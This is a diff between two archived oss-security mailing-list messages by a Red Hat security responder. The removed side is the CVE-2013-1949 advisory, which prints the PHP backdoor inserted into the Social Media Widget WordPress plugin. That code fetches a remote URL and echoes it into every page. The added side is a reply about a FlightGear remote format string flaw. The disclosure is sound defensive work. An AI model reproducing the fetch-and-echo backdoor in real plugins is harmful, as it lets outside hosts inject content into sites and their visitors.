@@ -1,52 +1,49 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/14/1
-Message-ID: <516A2D12.3080905@redhat.com>
-Date: Sat, 13 Apr 2013 22:14:10 -0600
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/30/6
+Message-ID: <517FF1C1.1030105@redhat.com>
+Date: Tue, 30 Apr 2013 10:30:57 -0600
 From: Kurt Seifried <kseifried@...hat.com>
-To: Open Source Security <oss-security@...ts.openwall.com>, security@...dpress.org
-Subject: CVE-2013-1949 Social Media Widget remote file inclusion
+To: oss-security@...ts.openwall.com
+CC: Andrés Gómez Ramírez <andresgomezram7@...il.com>, bugtraq@...urityfocus.com
+Subject: Re: Flightgear remote format string
 Content-Type: text/plain; charset=utf-8
 
 -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA1
 
-http://blog.sucuri.net/2013/04/wordpress-plugin-social-media-widget.html
-http://securityledger.com/hacked-wordpress-plug-in-put-on-double-secret-probation/
-http://it.slashdot.org/story/13/04/13/212226/popular-wordpress-plug-in-caught-spamming-is-put-on-probation
+On 04/30/2013 10:11 AM, Andrés Gómez Ramírez wrote:
+> Hi,
+> 
+> Introduction:
+> 
+> FlightGear is an open-source flight simulator.  It supports a
+> variety of popular platforms (Windows, Mac, Linux, etc.) and is
+> developed by skilled volunteers from around the world.  Source code
+> for the entire project is available and licensed under the GNU
+> General Public License.
+> 
+> Bug:
+> 
+> Flightgear allows remote control through Property tree.  It is
+> vulnerable to remote format string vulnerability when some special
+> parameters related with clouds are changed.  This could allow to
+> crash the application or potentially execute arbitrary code under
+> certain conditions.
+> 
+> Fix:
+> 
+> No fix.
+> 
+> References:
+> 
+> http://kuronosec.blogspot.com/2013/04/flightgear-remote-format-string.html
 
-So the company responsible for Social Media Widget claims that a rogue
-developer they contracted inserted this code:
+What
+> 
+is the default setting for flight tree? does it listen t the
+network public interface, localhost, is it disabled by default, or?
+Thanks.
 
-470
-471	 $smw_url = "hxxp://i.aaur.net/i.php";
-472	 if(!function_exists("smw_get")){
-473	 function smw_get($f) {
-474	 $response = wp_remote_get( $f );
-475	 if( is_wp_error( $response ) ) {
-476	 function smw_get_body($f) {
-477	 $ch = @curl_init();
-478	 @curl_setopt($ch, CURLOPT_URL, $f);
-479	 @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-480	 $output = @curl_exec($ch);
-481	 @curl_close($ch);
-482	 return $output;
-483	 }
-484	 echo smw_get_body($f);
-485	 } else {
-486	 echo $response["body"];
-487	 }
-488	 }
-489	 smw_get($smw_url);
-490	 }
-
-Regardless of HOW this code got into the plugin it represents a
-significant security issue. Any site using this plugin is pulling
-"hxxp://i.aaur.net/i.php" and including it in the page they generate
-and send to a user. This opens up a huge can of worms, anyone that can
-man in the middle your server can now inject PHP into your blog, ot
-anything sent to the clients/etc.
-
-Please use CVE-2013-1949 for this issue.
 
 - -- 
 Kurt Seifried Red Hat Security Response Team (SRT)
@@ -54,17 +51,17 @@ PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
 -----BEGIN PGP SIGNATURE-----
 Version: GnuPG v1.4.13 (GNU/Linux)
 
-iQIcBAEBAgAGBQJRai0SAAoJEBYNRVNeJnmT6loP/RkU7/7kLWkbMxzxK09A8LQs
-S/YkaDcc3jx9qPL7RLEW837U/KVEuPxtCN1rHv4r/q2ZVsRUiNhkO/vhB37jXmrX
-gNLP6sm0SMXj0v9FrllcDi6YsHmbekMInEdH3u+X9qE2nHJWsadXyzX6Pl4l3nOf
-cC18tNm6QB6pTV1JCP3OZcri+AMP8tqMJA9E1evgsvu+0kPFB/6rgKViteA/ejVg
-gkkiy6jdRnXw2PMsFVM0dOoXAXknvQu/7Ow0e2ONWhyhWIk6vifIqhtAqja58u/7
-bqV/Jd7fLuj2fZEkuckZILbk+jgnTEdkVz12ym5/1ieYUtzj6KxhSP2lAwsWwV0F
-+MKpeS0wW3z8KMzPnSGf8NOw+GdU+N+HzSgj6xpOUho53KFUppv2690CTlMMI9L6
-drOOpDyP296pZPf7eoulnJnUOCSH8gX4+Rvk75YNrHnYL8VTxgUGcmJWyGLuQdGC
-/ZI1IHdlkaRgL1O6w/DlLpKHV7E0Fj3silt/WwKwhB4kYQiei0dmVEuuMmYgq3vJ
-6srRO5Glk9peB+3LHRXEUd8z36GZFXP0mmssPiWLuq1NfzROrYSq4xaqKuPsQ+uo
-1tkrZ02LNsN7j2vFDLrTK6RpY6BjMUQvdY6rtiuy7fdbndNF6tt5rWr4xjIKoXti
-DpvupDzrdKT6n8ffkTqV
-=wTdQ
+iQIcBAEBAgAGBQJRf/HBAAoJEBYNRVNeJnmT2esP/3B/cfmFPdzhv9Zv7jpRSPTN
+bW5ZvtrgEsWo5wmDewelvAnoaeOg1V/n5vb7rk1/j7AG02NhuNpdHIID6t7sr0lE
+glNhOUM/b0GmtEPsHUBAHTODsRXUt4vFO1QXfOTHF3tgkY2JYx1zTiBI3jdIioV6
+icpaaL2TluIBem/YbYvzxYAnnhdAKmZdu5+OKPuiQ0vguNoOZgOUAEte39ZrzBv0
+xSf6lfDGOmO/5n/gOTZ0o6hbJMKTcmGPVze4i3choGfjo+cH7LpWSjHP4zAe5amJ
+iByH3BLKe0DQSGnhhEx/Rz6vL/kjqKuRHQ+Qj09SQiMKMGSyBnKp6VUzI7cbknyE
+XBU/Z4onTQNMjadyXTWRTs2aOvsI3jo6um2vbWq7PBAglBsoUdzM+ocTeUd5uhgf
+Q0a9rlUkq2/iRMtqwfh+cSnXOWk6YB83l2oDMVllHRlW5NfPXSdbTCHNLttep5sS
+C5PFyXmc6SeUPDbz00hwjBV6qqAAoLvBgsJdMGbidT1PIh5rCbbVetmcIsrBjpuI
+NqKU7YH0yz0iSHWN7TS6yEho6nyXFZNAMX2HE+I07RDNFnYDAZB2+UeDfvqdNIkL
+xoR2/4QaRxoDDz/DclJ64ZGk7ttPLCztJIVd0XXe9qHQyKjzQEqvCERh2Wtsta4G
+PsHQq+gYKaGmfVWkfq0Q
+=BfNa
 -----END PGP SIGNATURE-----
